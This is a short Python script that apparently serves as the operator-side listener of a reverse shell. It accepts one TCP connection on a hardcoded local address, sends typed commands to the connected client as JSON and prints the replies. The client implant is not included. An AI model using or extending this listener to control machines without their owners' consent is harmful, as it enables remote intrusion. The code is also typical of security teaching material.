#!/usr/bin/python3

#########################################################################################
#   Simple server ... almost
#########################################################################################

import socket
import json


S_IP = "192.168.0.13"
S_PORT = 9091


class ServerN1F:
    def __init__(self, ip, port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((ip, port))
        server.listen(1)
        print("[+] Waiting for connections")
        self.conn, addr = server.accept()
        print(f"[+] Client connected  {str(addr)}")

#   #####################################################################################
#   JSON serialization ...

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.conn.sendall(bytes(json_data, encoding="utf-8"))

    def reliable_recv(self):
        json_data = self.conn.recv(4096)
        return json.loads(json_data)
#   #####################################################################################

    def execute_command(self, command):
        self.reliable_send(command)
        resp = self.reliable_recv()
        return resp

    def run_server(self):
        while True:
            command = input("$ ")
            result = self.execute_command(command)
            print(result)


if __name__ == "__main__":
    s = ServerN1F(S_IP, S_PORT)
    s.run_server()




